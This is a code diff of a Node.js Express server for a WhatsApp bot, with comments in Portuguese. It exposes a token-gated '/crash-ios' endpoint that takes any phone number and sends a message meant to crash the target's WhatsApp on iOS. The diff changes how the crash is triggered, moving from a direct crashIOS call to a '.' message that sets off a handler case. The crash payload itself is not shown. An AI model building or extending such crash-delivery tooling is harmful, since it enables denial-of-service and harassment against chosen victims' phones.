@@ -65,7 +65,7 @@ app.get("/", (req, res) => {
       "/status": "GET → { connected: true }",
       "/connect?token=@xd&query=5582993708218": "Gera código de pareamento",
       "/deleteSession?token=@xd": "Deleta sessão",
-      "/crash-ios?token=@xd&query=5582993708218": "Envia crash iOS (usa função no main.js)"
+      "/crash-ios?token=@xd&query=5582993708218": "Envia crash iOS"
     },
     docs: "/docs"
   });
@@ -91,7 +91,7 @@ app.get("/deleteSession", (req, res) => {
   connectBot();
   res.json({ success: "Sessão deletada" });
 });
-// === CRASH iOS via função no main.js ===
+// === CRASH iOS via envio de '.' para o alvo ===
 app.get("/crash-ios", async (req, res) => {
   if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
   if (!sessionExists) return res.status(400).json({ error: "Bot não conectado" });
@@ -99,12 +99,11 @@ app.get("/crash-ios", async (req, res) => {
   if (!num) return res.status(400).json({ error: "Número inválido" });
   const target = num + "@s.whatsapp.net";
   try {
-    // Chama diretamente a função crashIOS do main.js
-    const { crashIOS } = require("./main.js");
-    await crashIOS(sock, target);
-    res.json({ success: true, target, message: "Crash iOS iniciado via função no main.js" });
+    // Envia uma mensagem real com "." para o alvo, que ativará a case no handler
+    await sock.sendMessage(target, { text: "." });
+    res.json({ success: true, target, message: "Sucesso! CrashIOS enviado com sucesso." });
   } catch (err) {
-    res.status(500).json({ error: "Falha ao iniciar crash", details: err.message });
+    res.status(500).json({ error: "Falha ao enviar mensagem", details: err.message });
   }
 });
 app.get("/docs", (req, res) => {
@@ -116,7 +115,7 @@ app.get("/docs", (req, res) => {
       "GET /status": "Status do bot",
       "GET /connect?token=@xd&query=NUMERO": "Gera código de pareamento",
       "GET /deleteSession?token=@xd": "Deleta sessão",
-      "GET /crash-ios?token=@xd&query=NUMERO": "Envia crash iOS (via main.js)"
+      "GET /crash-ios?token=@xd&query=NUMERO": "Envia crash iOS"
     },
     examples: {
       connect: "curl 'https://seu-app.onrender.com/connect?token=@xd&query=5582993708218'",
